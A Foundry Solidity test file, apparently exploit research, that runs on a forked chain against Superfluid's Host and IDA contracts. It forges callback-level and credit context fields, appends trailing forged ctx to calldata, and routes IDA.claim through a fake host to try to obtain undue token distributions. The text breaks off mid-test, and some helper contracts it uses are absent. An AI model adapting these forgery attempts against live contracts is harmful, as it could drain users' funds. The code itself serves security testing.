// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/// @title Attempt62: Callback Level Forgery Research
/// @notice Tests what happens when we call HOST.callAgreement(IDA, claim_with_trailing_forged_ctx)
///         where the forged ctx has callType=APP_CALLBACK and appCallbackLevel>0.
///
///         Theory: If the Host thinks we're already inside a callback frame,
///         appCallbackPush will increment level further, and the callback
///         system may behave differently (e.g., skip checks, allow extra credit).

// ── Minimal interfaces ──────────────────────────────────────────────────

interface ISuperfluid {
    function callAgreement(address agreementClass, bytes calldata callData, bytes calldata userData)
        external
        returns (bytes memory);

    function callAgreementWithContext(
        address agreementClass,
        bytes calldata callData,
        bytes calldata userData,
        bytes calldata ctx
    ) external returns (bytes memory newCtx, bytes memory returnedData);

    function isApp(address app) external view returns (bool);
    function getAppManifest(address app) external view returns (bool, bool, uint256);

    function registerAppByFactory(address app, uint256 configWord) external;
}

interface IIDA {
    function claim(address token, address publisher, uint32 indexId, address subscriber, bytes calldata ctx)
        external
        returns (bytes memory);

    function createIndex(address token, uint32 indexId, bytes calldata ctx) external returns (bytes memory);

    function updateSubscription(
        address token, uint32 indexId, address subscriber, uint128 units, bytes calldata ctx
    ) external returns (bytes memory);

    function updateIndex(address token, uint32 indexId, uint128 indexValue, bytes calldata ctx)
        external
        returns (bytes memory);

    function getIndex(address token, address publisher, uint32 indexId)
        external
        view
        returns (bool exist, uint128 indexValue, uint128 totalUnitsApproved, uint128 totalUnitsPending);

    function getSubscription(address token, address publisher, uint32 indexId, address subscriber)
        external
        view
        returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

interface IMATICx {
    function balanceOf(address) external view returns (uint256);
    function realtimeBalanceOfNow(address) external view returns (int256, uint256, uint256);
    function upgradeByETH() external payable;
    function downgradeToETH(uint256) external;
    function getHost() external view returns (address);
}

interface ISuperToken {
    function balanceOf(address) external view returns (uint256);
    function getUnderlyingToken() external view returns (address);
    function upgrade(uint256 amount) external;
    function downgrade(uint256 amount) external;
    function getHost() external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface ISuperApp {
    function beforeAgreementUpdated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata ctx
    ) external view returns (bytes memory cbdata);

    function afterAgreementUpdated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata cbdata,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);
}

// ── ContextUtils (inline) ───────────────────────────────────────────────

library CtxLib {
    uint256 internal constant CALL_INFO_CALL_TYPE_SHIFT = 32;

    function encodeCallInfo(uint8 appCallbackLevel, uint8 callType)
        internal
        pure
        returns (uint256 callInfo)
    {
        callInfo = uint256(appCallbackLevel) | (uint256(callType) << CALL_INFO_CALL_TYPE_SHIFT);
    }

    function encodeCtx(
        uint8 appCallbackLevel,
        uint8 callType,
        uint256 timestamp,
        address msgSender,
        bytes4 agreementSelector,
        bytes memory userData,
        uint256 appCreditGranted,
        uint256 appCreditWantedDeprecated,
        int256 appCreditUsed,
        address appAddress,
        address appCreditToken
    ) internal pure returns (bytes memory) {
        uint256 callInfo = encodeCallInfo(appCallbackLevel, callType);
        uint256 creditIO = uint256(uint128(appCreditGranted)) | (uint256(uint128(appCreditWantedDeprecated)) << 128);

        return abi.encode(
            abi.encode(callInfo, timestamp, msgSender, agreementSelector, userData),
            abi.encode(creditIO, appCreditUsed, appAddress, appCreditToken)
        );
    }

    function decodeCtx(bytes memory packed)
        internal
        pure
        returns (
            uint8 appCallbackLevel,
            uint8 callType,
            uint256 timestamp,
            address msgSender,
            bytes4 agreementSelector,
            bytes memory userData,
            uint256 appCreditGranted,
            int256 appCreditUsed,
            address appAddress,
            address appCreditToken
        )
    {
        (bytes memory ctx1, bytes memory ctx2) = abi.decode(packed, (bytes, bytes));

        uint256 callInfo;
        (callInfo, timestamp, msgSender, agreementSelector, userData) =
            abi.decode(ctx1, (uint256, uint256, address, bytes4, bytes));
        appCallbackLevel = uint8(callInfo & 0xFF);
        callType = uint8((callInfo >> 32) & 0xF);

        uint256 creditIO;
        (creditIO, appCreditUsed, appAddress, appCreditToken) =
            abi.decode(ctx2, (uint256, int256, address, address));
        appCreditGranted = creditIO & type(uint128).max;
    }
}

// ── Publisher SuperApp that logs everything ──────────────────────────────

/// @notice A SuperApp that the publisher role is played by. It logs all callback
///         ctx fields so we can see exactly what the forged ctx looks like inside
///         the callback system.
contract LoggingPublisherApp {
    address public immutable host;
    address public immutable ida;
    address public immutable superToken;
    address public immutable owner;

    // Logged data from callbacks
    bool public beforeCalled;
    bool public afterCalled;

    // ctx fields seen in beforeAgreementUpdated
    uint8 public before_appCallbackLevel;
    uint8 public before_callType;
    address public before_msgSender;
    uint256 public before_appCreditGranted;
    int256 public before_appCreditUsed;
    address public before_appAddress;
    address public before_appCreditToken;

    // ctx fields seen in afterAgreementUpdated
    uint8 public after_appCallbackLevel;
    uint8 public after_callType;
    address public after_msgSender;
    uint256 public after_appCreditGranted;
    int256 public after_appCreditUsed;
    address public after_appAddress;
    address public after_appCreditToken;

    // balance snapshots
    uint256 public before_tokenBalance;
    uint256 public after_tokenBalance;

    constructor(address host_, address ida_, address superToken_) {
        host = host_;
        ida = ida_;
        superToken = superToken_;
        owner = msg.sender;
    }

    function beforeAgreementUpdated(
        address, /* superToken */
        address, /* agreementClass */
        bytes32, /* agreementId */
        bytes calldata, /* agreementData */
        bytes calldata ctx
    ) external view returns (bytes memory cbdata) {
        // Can't write storage in view, but we can return data
        (
            uint8 appCallbackLevel,
            uint8 callType,
            ,
            address msgSender,
            ,
            ,
            uint256 appCreditGranted,
            int256 appCreditUsed,
            address appAddress,
            address appCreditToken
        ) = CtxLib.decodeCtx(ctx);

        cbdata = abi.encode(
            appCallbackLevel,
            callType,
            msgSender,
            appCreditGranted,
            appCreditUsed,
            appAddress,
            appCreditToken,
            ISuperToken(superToken).balanceOf(address(this))
        );
    }

    function afterAgreementUpdated(
        address, /* superToken */
        address, /* agreementClass */
        bytes32, /* agreementId */
        bytes calldata, /* agreementData */
        bytes calldata cbdata,
        bytes calldata ctx
    ) external returns (bytes memory newCtx) {
        afterCalled = true;

        // Decode before-callback data
        (
            before_appCallbackLevel,
            before_callType,
            before_msgSender,
            before_appCreditGranted,
            before_appCreditUsed,
            before_appAddress,
            before_appCreditToken,
            before_tokenBalance
        ) = abi.decode(cbdata, (uint8, uint8, address, uint256, int256, address, address, uint256));

        // Decode after-callback ctx
        (
            after_appCallbackLevel,
            after_callType,
            ,
            after_msgSender,
            ,
            ,
            after_appCreditGranted,
            after_appCreditUsed,
            after_appAddress,
            after_appCreditToken
        ) = CtxLib.decodeCtx(ctx);

        after_tokenBalance = ISuperToken(superToken).balanceOf(address(this));
        beforeCalled = true;

        // Try to call callAgreementWithContext from inside the callback
        // to see if forged high appLevel lets us do things
        newCtx = ctx;
    }

    receive() external payable {}
}

// ── Test contract ───────────────────────────────────────────────────────

contract Attempt62_CallbackLevelForgery is Test {
    using CtxLib for *;

    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA  = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    // Known publisher/subscriber with pending distribution for baseline test
    address constant KNOWN_PUB = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
    address constant KNOWN_SUB = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;
    uint32  constant KNOWN_IDX = 1;

    uint32 constant TEST_INDEX = 999_000_001;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"), 27039967);
    }

    // ═══════════════════════════════════════════════════════════════════
    // Test 1: Baseline — normal claim via Host (no forgery)
    // ═══════════════════════════════════════════════════════════════════

    function test_01_baseline_normal_claim_via_host() public {
        console.log("=== TEST 1: Baseline normal claim via Host ===");

        // Check known subscription
        (bool exist, bool approved, uint128 units, uint256 pending) =
            IIDA(IDA).getSubscription(MATICx, KNOWN_PUB, KNOWN_IDX, KNOWN_SUB);
        console.log("subscription exists:", exist);
        console.log("subscription approved:", approved);
        console.log("subscription units:", units);
        console.log("pending distribution:", pending);

        if (pending == 0) {
            console.log("SKIP: no pending distribution for known pair");
            return;
        }

        uint256 subBalBefore = IMATICx(MATICx).balanceOf(KNOWN_SUB);

        // Normal claim via Host
        bytes memory claimCalldata = abi.encodeWithSelector(
            IIDA.claim.selector, MATICx, KNOWN_PUB, KNOWN_IDX, KNOWN_SUB, new bytes(0)
        );

        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(IDA, claimCalldata, "") {
            uint256 subBalAfter = IMATICx(MATICx).balanceOf(KNOWN_SUB);
            console.log("SUCCESS: sub balance delta:", subBalAfter - subBalBefore);
        } catch Error(string memory reason) {
            console.log("REVERTED:", reason);
        } catch (bytes memory) {
            console.log("REVERTED with raw bytes");
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    // Test 2: Self-created index, claim with forged ctx trailing bytes
    //         callType=APP_CALLBACK, appCallbackLevel=1
    // ═══════════════════════════════════════════════════════════════════

    function test_02_forged_callback_level_self_index() public {
        console.log("=== TEST 2: Forged callType=CALLBACK, appLevel=1 ===");

        // Setup: create index, subscriber, distribute, then claim with forged ctx
        vm.deal(ATTACKER, 10 ether);
        vm.startPrank(ATTACKER);

        // Mint some MATICx
        IMATICx(MATICx).upgradeByETH{value: 1 ether}();
        uint256 mxBal = IMATICx(MATICx).balanceOf(ATTACKER);
        console.log("attacker MATICx balance:", mxBal);

        // Create index
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.createIndex.selector, MATICx, TEST_INDEX, new bytes(0)),
            ""
        );
        console.log("index created");

        // Create subscription for attacker themselves as subscriber
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(
                IIDA.updateSubscription.selector, MATICx, TEST_INDEX, ATTACKER, uint128(1), new bytes(0)
            ),
            ""
        );
        console.log("subscription created (subscriber=attacker, units=1)");

        // Distribute
        uint128 distAmount = uint128(mxBal);
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(
                IIDA.updateIndex.selector, MATICx, TEST_INDEX, distAmount, new bytes(0)
            ),
            ""
        );
        console.log("distributed:", distAmount);

        vm.stopPrank();

        // Now check pending
        (bool exist2, bool approved2, uint128 units2, uint256 pending2) =
            IIDA(IDA).getSubscription(MATICx, ATTACKER, TEST_INDEX, ATTACKER);
        console.log("sub exists:", exist2);
        console.log("sub approved:", approved2);
        console.log("sub units:", units2);
        console.log("pending:", pending2);

        // The subscription is auto-approved since publisher=subscriber
        // Need a different subscriber
        console.log("NOTE: self-subscription may be auto-approved, need separate receiver");
    }

    // ═══════════════════════════════════════════════════════════════════
    // Test 3: SuperApp publisher with forged callback-level ctx
    //         Full setup with logging publisher app
    // ═══════════════════════════════════════════════════════════════════

    function test_03_superapp_publisher_forged_ctx() public {
        console.log("=== TEST 3: SuperApp publisher + forged callback-level ctx ===");

        vm.deal(ATTACKER, 10 ether);

        // Deploy LoggingPublisherApp
        vm.startPrank(ATTACKER);
        LoggingPublisherApp pubApp = new LoggingPublisherApp(HOST, IDA, MATICx);
        address pubAddr = address(pubApp);
        console.log("publisher app deployed at:", pubAddr);

        // Register as SuperApp using vm.etch to set the app manifest in the Host
        // The Host stores app manifests in a mapping. We use registerAppByFactory
        // or directly set storage. Let's try registerAppByFactory first.
        vm.stopPrank();

        // Register pubApp as SuperApp by calling registerAppByFactory from a factory
        // We need to be a registered factory or use vm.store to set the manifest
        _registerAsSuperApp(pubAddr);

        // Verify registration
        (bool isSuperApp, bool isJailed, uint256 noopMask) = ISuperfluid(HOST).getAppManifest(pubAddr);
        console.log("pubApp isSuperApp:", isSuperApp);
        console.log("pubApp isJailed:", isJailed);
        console.log("pubApp noopMask:", noopMask);

        if (!isSuperApp) {
            console.log("WARN: SuperApp registration failed, trying alternate method");
            _registerAsSuperAppAlternate(pubAddr);
            (isSuperApp, isJailed, noopMask) = ISuperfluid(HOST).getAppManifest(pubAddr);
            console.log("pubApp isSuperApp (2nd try):", isSuperApp);
        }

        // Mint MATICx to publisher app
        vm.deal(pubAddr, 2 ether);
        vm.prank(pubAddr);
        IMATICx(MATICx).upgradeByETH{value: 1 ether}();
        uint256 pubMxBal = IMATICx(MATICx).balanceOf(pubAddr);
        console.log("pubApp MATICx balance:", pubMxBal);

        // Create index from publisher app via Host
        vm.prank(pubAddr);
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.createIndex.selector, MATICx, TEST_INDEX, new bytes(0)),
            ""
        );
        console.log("index created by pubApp");

        // Create subscription: subscriber = ATTACKER (unapproved)
        vm.prank(pubAddr);
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(
                IIDA.updateSubscription.selector, MATICx, TEST_INDEX, ATTACKER, uint128(1), new bytes(0)
            ),
            ""
        );
        console.log("subscription created (subscriber=ATTACKER, units=1)");

        // Distribute from pubApp
        uint128 distAmount = uint128(pubMxBal);
        vm.prank(pubAddr);
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(
                IIDA.updateIndex.selector, MATICx, TEST_INDEX, distAmount, new bytes(0)
            ),
            ""
        );
        console.log("distributed:", distAmount);

        // Verify pending
        (bool exist, bool approved, uint128 units, uint256 pending) =
            IIDA(IDA).getSubscription(MATICx, pubAddr, TEST_INDEX, ATTACKER);
        console.log("pending distribution:", pending);
        require(pending > 0, "no pending distribution");

        // ─── Now attempt claim with various forged ctx fields ───

        uint256 atkBalBefore = IMATICx(MATICx).balanceOf(ATTACKER);
        console.log("attacker MATICx before:", atkBalBefore);

        // Variant A: forged callType=APP_CALLBACK(3), appCallbackLevel=1
        _tryClaim(
            "A: callType=3, level=1, credit=0",
            pubAddr, ATTACKER, TEST_INDEX,
            1,      // appCallbackLevel
            3,      // callType = APP_CALLBACK
            ATTACKER,  // msgSender
            0,      // appCreditGranted
            0,      // appCreditUsed
            address(0), // appAddress
            address(0)  // appCreditToken
        );

        // Variant B: forged callType=APP_CALLBACK(3), appCallbackLevel=1, maxCredit
        _tryClaim(
            "B: callType=3, level=1, credit=MAX",
            pubAddr, ATTACKER, TEST_INDEX,
            1, 3, ATTACKER,
            type(uint128).max,  // appCreditGranted = MAX
            0,
            address(0),
            address(0)
        );

        // Variant C: forged callType=3, level=1, appAddress=attacker
        _tryClaim(
            "C: callType=3, level=1, appAddr=ATTACKER",
            pubAddr, ATTACKER, TEST_INDEX,
            1, 3, ATTACKER,
            type(uint128).max,
            0,
            ATTACKER,  // appAddress = attacker
            address(0)
        );

        // Variant D: forged callType=3, level=1, appAddress=Host
        _tryClaim(
            "D: callType=3, level=1, appAddr=HOST",
            pubAddr, ATTACKER, TEST_INDEX,
            1, 3, ATTACKER,
            type(uint128).max,
            0,
            HOST,  // appAddress = Host itself
            address(0)
        );

        // Variant E: forged callType=3, level=1, appAddress=pubApp, creditToken=MATICx
        _tryClaim(
            "E: callType=3, level=1, appAddr=pubApp, creditToken=MATICx",
            pubAddr, ATTACKER, TEST_INDEX,
            1, 3, ATTACKER,
            type(uint128).max,
            0,
            pubAddr,    // appAddress = publisher app
            MATICx      // appCreditToken = MATICx
        );

        // Variant F: forged callType=1 (AGREEMENT), level=0, maxCredit, appAddr=pubApp
        _tryClaim(
            "F: callType=1, level=0, credit=MAX, appAddr=pubApp",
            pubAddr, ATTACKER, TEST_INDEX,
            0, 1, ATTACKER,
            type(uint128).max,
            0,
            pubAddr,
            MATICx
        );

        // Variant G: forged callType=3, level=2 (deep nesting)
        _tryClaim(
            "G: callType=3, level=2 (deep)",
            pubAddr, ATTACKER, TEST_INDEX,
            2, 3, ATTACKER,
            type(uint128).max,
            0,
            pubAddr,
            MATICx
        );

        // Variant H: forged callType=3, level=1, negative appCreditUsed
        _tryClaim(
            "H: callType=3, level=1, creditUsed=-MAX",
            pubAddr, ATTACKER, TEST_INDEX,
            1, 3, ATTACKER,
            type(uint128).max,
            type(int256).min,  // negative credit used
            pubAddr,
            MATICx
        );

        uint256 atkBalAfter = IMATICx(MATICx).balanceOf(ATTACKER);
        console.log("attacker MATICx after all variants:", atkBalAfter);
        console.log("attacker MATICx delta:", int256(atkBalAfter) - int256(atkBalBefore));

        // Log the publisher app's callback observations
        if (pubApp.afterCalled()) {
            console.log("=== Publisher App Callback Observations ===");
            console.log("before_appCallbackLevel:", pubApp.before_appCallbackLevel());
            console.log("before_callType:", pubApp.before_callType());
            console.log("before_msgSender:", pubApp.before_msgSender());
            console.log("before_appCreditGranted:", pubApp.before_appCreditGranted());
            console.log("before_appCreditUsed:", pubApp.before_appCreditUsed());
            console.log("before_appAddress:", pubApp.before_appAddress());
            console.log("before_appCreditToken:", pubApp.before_appCreditToken());
            console.log("before_tokenBalance:", pubApp.before_tokenBalance());
            console.log("after_appCallbackLevel:", pubApp.after_appCallbackLevel());
            console.log("after_callType:", pubApp.after_callType());
            console.log("after_msgSender:", pubApp.after_msgSender());
            console.log("after_appCreditGranted:", pubApp.after_appCreditGranted());
            console.log("after_appCreditUsed:", pubApp.after_appCreditUsed());
            console.log("after_appAddress:", pubApp.after_appAddress());
            console.log("after_appCreditToken:", pubApp.after_appCreditToken());
            console.log("after_tokenBalance:", pubApp.after_tokenBalance());
        } else {
            console.log("Publisher app afterAgreementUpdated was NOT called");
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    // Test 4: Direct IDA.claim() with FakeHost (like DrainHost) but
    //         with forged ctx that has callType=CALLBACK, high level
    // ═══════════════════════════════════════════════════════════════════

    function test_04_direct_ida_claim_fakehost_forged_callback_ctx() public {
        console.log("=== TEST 4: Direct IDA.claim via FakeHost with forged callback ctx ===");

        vm.deal(ATTACKER, 10 ether);

        // Setup: create index via real Host
        vm.startPrank(ATTACKER);
        IMATICx(MATICx).upgradeByETH{value: 1 ether}();

        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.createIndex.selector, MATICx, TEST_INDEX + 100, new bytes(0)),
            ""
        );

        // Deploy a simple receiver
        SimpleReceiver receiver = new SimpleReceiver();

        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(
                IIDA.updateSubscription.selector, MATICx, TEST_INDEX + 100, address(receiver), uint128(1), new bytes(0)
            ),
            ""
        );

        uint256 mxBal = IMATICx(MATICx).balanceOf(ATTACKER);
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(
                IIDA.updateIndex.selector, MATICx, TEST_INDEX + 100, uint128(mxBal), new bytes(0)
            ),
            ""
        );
        vm.stopPrank();

        (,, , uint256 pending) = IIDA(IDA).getSubscription(MATICx, ATTACKER, TEST_INDEX + 100, address(receiver));
        console.log("pending distribution:", pending);
        require(pending > 0, "no pending");

        // Deploy FakeHost with callback-level forgery
        ForgeryFakeHost fakeHost = new ForgeryFakeHost(IDA, MATICx);

        // The FakeHost calls IDA.claim() directly, simulating being the Host
        // but with forged ctx that has callType=3, appLevel=1

        // Variant 1: callType=3, level=1, credit=MAX
        bytes memory forgedCtx1 = CtxLib.encodeCtx(
            1,      // appCallbackLevel
            3,      // callType = APP_CALLBACK
            block.timestamp,
            ATTACKER,
            IIDA.claim.selector,
            "",
            type(uint128).max,  // appCreditGranted
            0,      // appCreditWantedDeprecated
            0,      // appCreditUsed
            ATTACKER,  // appAddress
            MATICx     // appCreditToken
        );

        uint256 receiverBalBefore = IMATICx(MATICx).balanceOf(address(receiver));
        console.log("receiver MATICx before:", receiverBalBefore);

        try fakeHost.claimWithForgedCtx(
            ATTACKER, TEST_INDEX + 100, address(receiver), forgedCtx1
        ) {
            console.log("FakeHost claim SUCCEEDED");
        } catch Error(string memory reason) {
            console.log("FakeHost claim REVERTED:", reason);
        } catch (bytes memory rawErr) {
            console.log("FakeHost claim REVERTED (raw), len:", rawErr.length);
        }

        uint256 receiverBalAfter = IMATICx(MATICx).balanceOf(address(receiver));
        console.log("receiver MATICx after:", receiverBalAfter);
        console.log("receiver delta:", int256(receiverBalAfter) - int256(receiverBalBefore));

        // Variant 2: callType=3, level=1, appAddress=0x0 (might skip composite app check)
        bytes memory forgedCtx2 = CtxLib.encodeCtx(
            1, 3, block.timestamp, ATTACKER, IIDA.claim.selector, "",
            type(uint128).max, 0, 0,
            address(0),  // appAddress = 0
            MATICx
        );

        try fakeHost.claimWithForgedCtx(
            ATTACKER, TEST_INDEX + 100, address(receiver), forgedCtx2
        ) {
            console.log("FakeHost claim v2 SUCCEEDED");
        } catch Error(string memory reason) {
            console.log("FakeHost claim v2 REVERTED:", reason);
        } catch (bytes memory) {
            console.log("FakeHost claim v2 REVERTED (raw)");
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    // Test 5: Attempt to use forged ctx to make Host.callAgreement
    //         behave as if inside callback — specifically testing if
    //         the Host's _callAgreement overwrites our forged ctx
    // ═══════════════════════════════════════════════════════════════════

    function test_05_host_callAgreement_ctx_overwrite_check() public {
        console.log("=== TEST 5: Does Host._callAgreement overwrite trailing forged ctx? ===");
        console.log("Testing if trailing bytes survive past Host's ctx replacement");

        vm.deal(ATTACKER, 10 ether);

        // Setup index
        vm.startPrank(ATTACKER);
        IMATICx(MATICx).upgradeByETH{value: 1 ether}();

        // Deploy a fresh logging publisher as SuperApp
        LoggingPublisherApp pubApp = new LoggingPublisherApp(HOST, IDA, MATICx);
        vm.stopPrank();

        _registerAsSuperApp(address(pubApp));

        // Fund pubApp and create index
        vm.deal(address(pubApp), 2 ether);
        vm.prank(address(pubApp));
        IMATICx(MATICx).upgradeByETH{value: 1 ether}();

        vm.prank(address(pubApp));
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.createIndex.selector, MATICx, TEST_INDEX + 200, new bytes(0)),
            ""
        );

        SimpleReceiver sub = new SimpleReceiver();
        vm.prank(address(pubApp));
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(
                IIDA.updateSubscription.selector, MATICx, TEST_INDEX + 200, address(sub), uint128(1), new bytes(0)
            ),
            ""
        );

        uint256 pubBal = IMATICx(MATICx).balanceOf(address(pubApp));
        vm.prank(address(pubApp));
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(
                IIDA.updateIndex.selector, MATICx, TEST_INDEX + 200, uint128(pubBal), new bytes(0)
            ),
            ""
        );

        // Now claim with trailing forged ctx
        // The Host's _callAgreement creates its own ctx and replaces the placeholder.
        // The trailing bytes (forged ctx) should be at the END of callData, past what
        // the Host's _callExternalWithReplacedCtx replaces.
        // But does IDA.claim() read the LAST ctx parameter (trailing) or the one
        // spliced in by Host?

        bytes memory innerClaimCalldata = abi.encodeWithSelector(
            IIDA.claim.selector, MATICx, address(pubApp), TEST_INDEX + 200, address(sub), new bytes(0)
        );

        // Forge a trailing ctx
        bytes memory forgedCtx = CtxLib.encodeCtx(
            1, 3, block.timestamp, ATTACKER, IIDA.claim.selector, "",
            type(uint128).max, 0, 0, ATTACKER, MATICx
        );

        // Append forged ctx as trailing bytes after the normal calldata
        bytes memory calldataWithTrailing = abi.encodePacked(innerClaimCalldata, abi.encode(forgedCtx));

        console.log("innerClaimCalldata length:", innerClaimCalldata.length);
        console.log("calldataWithTrailing length:", calldataWithTrailing.length);

        uint256 subBalBefore = IMATICx(MATICx).balanceOf(address(sub));
        console.log("subscriber balance before:", subBalBefore);

        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(IDA, calldataWithTrailing, "") {
            console.log("HOST.callAgreement with trailing ctx SUCCEEDED");
            uint256 subBalAfter = IMATICx(MATICx).balanceOf(address(sub));
            console.log("subscriber balance after:", subBalAfter);
            console.log("subscriber delta:", int256(subBalAfter) - int256(subBalBefore));

            // Check what the pubApp callback saw
            if (pubApp.afterCalled()) {
                console.log("=== Callback observations ===");
                console.log("before_appCallbackLevel:", pubApp.before_appCallbackLevel());
                console.log("before_callType:", pubApp.before_callType());
                console.log("before_msgSender:", pubApp.before_msgSender());
                console.log("before_appCreditGranted:", pubApp.before_appCreditGranted());
                console.log("after_appCallbackLevel:", pubApp.after_appCallbackLevel());
                console.log("after_callType:", pubApp.after_callType());
                console.log("after_msgSender:", pubApp.after_msgSender());
                console.log("after_appCreditGranted:", pubApp.after_appCreditGranted());
                console.log("after_appAddress:", pubApp.after_appAddress());
                console.log("after_appCreditToken:", pubApp.after_appCreditToken());
            }
        } catch Error(string memory reason) {
            console.log("HOST.callAgreement with trailing ctx REVERTED:", reason);
        } catch (bytes memory rawErr) {
            console.log("HOST.callAgreement with trailing ctx REVERTED raw, len:", rawErr.length);
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    // Test 6: Direct IDA.claim with multiple re-entries using
    //         forged callback-level ctx to see if higher levels
    //         change the claim/distribution behavior
    // ═══════════════════════════════════════════════════════════════════

    function test_06_callback_level_reentry_comparison() public {
        console.log("=== TEST 6: Compare claim behavior at different forged callback levels ===");

        vm.deal(ATTACKER, 10 ether);
        vm.startPrank(ATTACKER);
        IMATICx(MATICx).upgradeByETH{value: 2 ether}();

        // Create index
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(IIDA.createIndex.selector, MATICx, TEST_INDEX + 300, new bytes(0)),
            ""
        );

        SimpleReceiver sub = new SimpleReceiver();
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(
                IIDA.updateSubscription.selector, MATICx, TEST_INDEX + 300, address(sub), uint128(1), new bytes(0)
            ),
            ""
        );

        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(
                IIDA.updateIndex.selector, MATICx, TEST_INDEX + 300, uint128(1 ether), new bytes(0)
            ),
            ""
        );
        vm.stopPrank();

        (,,, uint256 pending) = IIDA(IDA).getSubscription(MATICx, ATTACKER, TEST_INDEX + 300, address(sub));
        console.log("pending:", pending);

        // Try FakeHost claims with different callback levels and callTypes
        // Matrix: callType x appLevel
        uint8[3] memory callTypes = [uint8(1), uint8(2), uint8(3)];
        string[3] memory ctNames = ["AGREEMENT", "APP_ACTION", "APP_CALLBACK"];

        for (uint256 ct = 0; ct < 3; ct++) {
            for (uint8 level = 0; level <= 2; level++) {
                uint256 snapId = vm.snapshot();

                ForgeryFakeHost fakeHost = new ForgeryFakeHost(IDA, MATICx);

                bytes memory ctx = CtxLib.encodeCtx(
                    level,
                    callTypes[ct],
                    block.timestamp,
                    ATTACKER,
                    IIDA.claim.selector,
                    "",
                    type(uint128).max,
                    0,
                    0,
                    ATTACKER,
                    MATICx
                );

                uint256 subBefore = IMATICx(MATICx).balanceOf(address(sub));

                try fakeHost.claimWithForgedCtx(
                    ATTACKER, TEST_INDEX + 300, address(sub), ctx
                ) {
                    uint256 subAfter = IMATICx(MATICx).balanceOf(address(sub));
                    console.log(string.concat(ctNames[ct], " level="), uint256(level), "=> SUCCESS, sub delta:", subAfter - subBefore);
                } catch Error(string memory reason) {
                    console.log(string.concat(ctNames[ct], " level="), uint256(level), string.concat("=> REVERTED: ", reason));
                } catch {
                    console.log(string.concat(ctNames[ct], " level="), uint256(level), "=> REVERTED (raw)");
                }

                vm.revertTo(snapId);
            }
        }

        // Also test: callType=1 (AGREEMENT), level=0, but with different credit values
        console.log("--- Credit value tests (callType=1, level=0) ---");
        uint256[4] memory credits = [uint256(0), uint256(1), uint256(type(uint128).max), uint256(1 ether)];
        string[4] memory creditLabels = ["credit=0", "credit=1", "credit=MAX128", "credit=1ETH"];

        for (uint256 i = 0; i < 4; i++) {
            uint256 snapId = vm.snapshot();
            ForgeryFakeHost fakeHost = new ForgeryFakeHost(IDA, MATICx);

            bytes memory ctx = CtxLib.encodeCtx(
                0, 1, block.timestamp, ATTACKER, IIDA.claim.selector, "",
                credits[i], 0, 0, ATTACKER, MATICx
            );

            uint256 subBefore = IMATICx(MATICx).balanceOf(address(sub));

            try fakeHost.claimWithForgedCtx(
                ATTACKER, TEST_INDEX + 300, address(sub), ctx
            ) {
                uint256 subAfter = IMATICx(MATICx).balanceOf(address(sub));
                console.log(creditLabels[i], "=> SUCCESS, sub delta:", subAfter - subBefore);
            } catch Error(string memory reason) {
                console.log(creditLabels[i], string.concat("=> REVERTED: ", reason));
            } catch {
                console.log(creditLabels[i], "=> REVERTED (raw)");
            }

            vm.revertTo(snapId);
        }

        // Test: callType=1, level=0, different msgSender values
        console.log("--- msgSender tests (callType=1, level=0, credit=0) ---");
        address[4] memory senders = [ATTACKER, HOST, address(sub), address(0)];
        string[4] memory senderLabels = ["sender=ATTACKER", "sender=HOST", "sender=SUB", "sender=0x0"];

        for (uint256 i = 0; i < 4; i++) {
            uint256 snapId = vm.snapshot();
            ForgeryFakeHost fakeHost = new ForgeryFakeHost(IDA, MATICx);

            bytes memory ctx = CtxLib.encodeCtx(
                0, 1, block.timestamp, senders[i], IIDA.claim.selector, "",
                0, 0, 0, address(0), address(0)
            );

            uint256 subBefore = IMATICx(MATICx).balanceOf(address(sub));

            try fakeHost.claimWithForgedCtx(
                ATTACKER, TEST_INDEX + 300, address(sub), ctx
            ) {
                uint256 subAfter = IMATICx(MATICx).balanceOf(address(sub));
                console.log(senderLabels[i], "=> SUCCESS, sub delta:", subAfter - subBefore);
            } catch Error(string memory reason) {
                console.log(senderLabels[i], string.concat("=> REVERTED: ", reason));
            } catch {
                console.log(senderLabels[i], "=> REVERTED (raw)");
            }

